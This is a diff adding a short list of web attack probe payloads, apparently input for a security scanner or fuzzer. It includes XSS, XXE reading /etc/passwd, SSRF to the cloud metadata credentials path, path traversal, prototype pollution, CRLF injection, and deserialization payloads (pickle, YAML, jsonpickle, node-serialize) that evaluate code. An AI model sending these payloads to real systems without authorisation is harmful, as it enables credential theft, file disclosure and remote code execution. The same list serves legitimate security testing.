@@ -1,0 +1,12 @@
+'"><img src=x onerror=alert(1337)><!--
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://{domain}/ssrf
+../../../../../../../etc/passwd
+{"__proto__":{"polluted":1337}}
+%0d%0aX-Injected:1337%0d%0a
+%s%s%s%s%s%s%s%s%s%s
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnNyoxOTEnCnRSLg==
+!!python/object/apply:builtins.eval ["7*191"]
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["7*191"]}]}
+{"rce":"_$$ND_FUNC$$_function(){return 7*191}()"}
